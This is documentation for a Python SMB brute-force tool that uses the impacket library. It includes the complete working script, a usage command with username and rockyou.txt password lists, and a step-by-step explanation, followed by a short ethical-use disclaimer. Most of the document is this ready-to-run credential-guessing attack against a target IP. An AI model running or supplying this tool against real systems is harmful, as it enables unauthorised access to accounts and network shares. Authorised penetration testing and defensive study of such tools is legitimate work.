# SMB Brute Force Tool
### SMB Brute Force Script Documentation

This documentation provides details on how to use the SMB Brute Force Script written in Python using the `impacket` library. This script attempts to brute force SMB login credentials on a specified target by trying combinations from provided username and password lists.

#### Prerequisites

Ensure you have Python installed. You also need the `impacket` library, which can be installed using `pip`:

```bash
pip install impacket
```

#### Script Description

The script performs the following functions:

1. **smb_login_test**: Attempts to log in to the SMB service on the target IP with the provided username and password.
2. **load_list_from_file**: Loads a list of usernames or passwords from a file, ensuring each entry is stripped of whitespace.
3. **brute_force_smb**: Iterates through combinations of usernames and passwords, calling `smb_login_test` for each combination.

#### Usage

To run the script, save it to a file named `smb_bruteforce.py` and execute it from the terminal with the necessary arguments.

##### Command Line Arguments

- `target_ip`: The IP address of the target SMB server.
- `-l` or `--userlist`: The path to the file containing the list of usernames.
- `-p` or `--passlist`: The path to the file containing the list of passwords.

##### Example Command

```bash
python smb_bruteforce.py <target ip> -l common_user.txt -p rockyou.txt
```

In this example:
- `192.168.1.10` is the target SMB server's IP address.
- `common_user.txt` is the file containing usernames.
- `rockyou.txt` is the file containing passwords.

#### Script Explanation

```python
import argparse
from impacket.smbconnection import SMBConnection
import time

def smb_login_test(target_ip, username, password, domain='', timeout=10):
    try:
        smb_connection = SMBConnection(target_ip, target_ip)
        smb_connection.login(username, password, domain)
        print(f"[+] Login successful on {target_ip} with username '{username}' and password '{password}'")
        smb_connection.logoff()
        return True
    except Exception as e:
        print(f"[-] Login failed on {target_ip} with username '{username}' and password '{password}'")
        return False

def load_list_from_file(file_path):
    try:
        with open(file_path, 'r', encoding='ISO-8859-1') as file:
            return [line.strip() for line in file.readlines()]
    except Exception as e:
        print(f"Error reading {file_path}: {e}")
        return []

def brute_force_smb(target_ip, username_list, password_list, domain=''):
    for username in username_list:
        for password in password_list:
            if smb_login_test(target_ip, username, password, domain):
                print(f"[!] Valid credentials found: {username} / {password}")
                return True
            time.sleep(1)  # Sleep to avoid rapid requests that may lock accounts
    return False

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="SMB Brute Force Script")
    parser.add_argument("target_ip", help="Target IP address")
    parser.add_argument("-l", "--userlist", required=True, help="Path to the username list file")
    parser.add_argument("-p", "--passlist", required=True, help="Path to the password list file")

    args = parser.parse_args()

    target_ip = args.target_ip
    username_file = args.userlist
    password_file = args.passlist

    username_list = load_list_from_file(username_file)
    password_list = load_list_from_file(password_file)

    if username_list and password_list:
        brute_force_smb(target_ip, username_list, password_list)
    else:
        print("Username list or password list is empty.")
```

### Detailed Steps

1. **Import Necessary Libraries**:
   The script imports the necessary libraries: `argparse` for parsing command line arguments, `SMBConnection` from `impacket` for SMB connections, and `time` for adding delay between login attempts.

2. **Define smb_login_test Function**:
   This function attempts to establish an SMB connection using the provided username and password. If successful, it prints a success message and logs off. If unsuccessful, it prints a failure message.

3. **Define load_list_from_file Function**:
   This function reads a file and returns a list of lines, stripped of any leading or trailing whitespace. It uses `ISO-8859-1` encoding to handle special characters in the `rockyou.txt` file.

4. **Define brute_force_smb Function**:
   This function takes a target IP, lists of usernames and passwords, and attempts to log in to the SMB server using each combination. It prints valid credentials if a successful login is found.

5. **Main Execution Block**:
   The script parses command line arguments for the target IP, username list file, and password list file. It then loads these lists and calls `brute_force_smb` to start the brute force attack.

### Notes

- **Ethical Use**: This script should only be used for ethical hacking and with permission from the owner of the target system.
- **Legal Implications**: Unauthorized use of this script can be illegal and punishable by law. Always ensure you have explicit permission before running any penetration testing tools.

This documentation should provide a comprehensive guide on how to use and understand the SMB Brute Force Script. If you have any questions or need further assistance, feel free to ask.
